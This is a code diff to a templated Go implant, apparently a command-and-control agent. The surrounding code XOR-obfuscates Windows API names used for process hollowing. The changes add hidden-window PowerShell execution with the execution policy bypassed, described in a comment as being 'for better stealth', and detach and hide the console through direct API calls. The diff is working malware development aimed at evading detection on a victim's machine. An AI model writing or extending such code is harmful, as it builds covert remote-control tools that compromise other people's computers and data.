@@ -83,6 +83,7 @@ var (
 	obfuscatedNtUnmapViewOfSection = []byte{0x0c, 0x36, 0x17, 0x2c, 0x2f, 0x23, 0x32, 0x14, 0x2b, 0x27, 0x35, 0x0d, 0x24, 0x11, 0x27, 0x21, 0x36, 0x2b, 0x2d, 0x2c} // "NtUnmapViewOfSection"
 	obfuscatedGetConsoleWindow = []byte{0x05, 0x27, 0x36, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "GetConsoleWindow"
 	obfuscatedShowWindow = []byte{0x11, 0x2a, 0x2d, 0x35, 0x15, 0x2b, 0x2c, 0x26, 0x2d, 0x35} // "ShowWindow"
+	obfuscatedFreeConsole = []byte{0x04, 0x30, 0x27, 0x27, 0x01, 0x2d, 0x2c, 0x31, 0x2d, 0x2e, 0x27} // "FreeConsole"
 
 	// XOR key for deobfuscation
 	obfuscationKey = byte(0x42)
@@ -106,6 +107,9 @@ var (
 	procSetThreadContext = kernel32.NewProc(deobfuscateString(obfuscatedSetThreadContext, obfuscationKey))
 	procReadProcessMemory = kernel32.NewProc(deobfuscateString(obfuscatedReadProcessMemory, obfuscationKey))
 	procNtUnmapViewOfSection = ntdll.NewProc(deobfuscateString(obfuscatedNtUnmapViewOfSection, obfuscationKey))
+	procFreeConsole = kernel32.NewProc(deobfuscateString(obfuscatedFreeConsole, obfuscationKey))
+	procShowWindow = user32.NewProc(deobfuscateString(obfuscatedShowWindow, obfuscationKey))
+	procGetConsoleWindow = kernel32.NewProc(deobfuscateString(obfuscatedGetConsoleWindow, obfuscationKey))
 )
 
 // PROCESSENTRY32 structure for process enumeration
@@ -850,7 +854,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		var cmd *exec.Cmd
 
 		if runtime.GOOS == "windows" {
-			cmd = exec.Command("powershell", "-Command", command)
+			cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
 		} else {
 			cmd = exec.Command("pwsh", "-Command", command)
 		}
@@ -873,7 +877,8 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 		var cmd *exec.Cmd
 
 		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd", "/C", command)
+			// Execute cmd commands through PowerShell with hidden window for better stealth
+			cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command)
 		} else {
 			cmd = exec.Command("sh", "-c", command)
 		}
@@ -1996,15 +2001,19 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 }
 
 func {AGENT_HIDE_CONSOLE_FUNC}() {
-	// Hide console window on Windows
+	// Hide console window on Windows using direct Windows API calls for immediate effect
 	if runtime.GOOS == "windows" {
-		// Deobfuscate DLL names for PowerShell command
-		kernel32Name := deobfuscateString(obfuscatedKernel32DLL, obfuscationKey)
-		user32Name := deobfuscateString(obfuscatedUser32DLL, obfuscationKey)
+		// Method 1: Use ShowWindow to hide the console window
+		consoleHandle, _, _ := procGetConsoleWindow.Call()
+		if consoleHandle != 0 {
+			procShowWindow.Call(
+				consoleHandle,  // HWND - console window handle
+				uintptr(0),     // nCmdShow - SW_HIDE constant
+			)
+		}
 
-		psCode := fmt.Sprintf("try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"%s\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"%s\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }", kernel32Name, user32Name)
-		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCode)
-		_ = cmd.Run() // Run command but ignore errors
+		// Method 2: Free the console to completely detach from the parent process
+		procFreeConsole.Call()
 	}
 }
 
